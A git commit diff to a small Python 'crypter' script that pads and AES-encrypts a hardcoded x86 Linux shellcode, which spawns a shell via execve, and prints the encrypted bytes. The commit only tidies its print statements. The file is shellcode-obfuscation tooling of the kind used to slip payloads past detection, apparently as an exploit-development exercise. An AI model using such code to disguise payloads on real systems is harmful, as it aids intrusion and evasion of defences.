205d086364e5310b4edf71618d2152151b197bc2
sachin <sachin3072004@gmail.com>
2018-12-18 23:28:51 -0800

    idented and removed comments.

--- crypter/crypter.py
+++ crypter/crypter.py
@@ -2,7 +2,6 @@ from Crypto.Cipher import AES
 
 shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"
 
-print type(shellcode)
 shellcodeLen = len(shellcode)
 lengthOfPadding = 16 - shellcodeLen % 16
 
@@ -12,9 +11,9 @@ shellcode += completePad
 
 obj = AES.new('This is a key123', AES.MODE_CBC, "1234567812345678")
 ciphertext = obj.encrypt(shellcode)
-print len(ciphertext)," ",ciphertext.encode('hex')
 encoded=""
 for x in bytearray(ciphertext):
     encoded += '\\x'
     encoded += '%02x' % x
-print encoded," ",len(encoded)," padding = ",lengthOfPadding
+print "Encrypted shellcode = " + encoded 
+print "Padding = "+ str(lengthOfPadding)
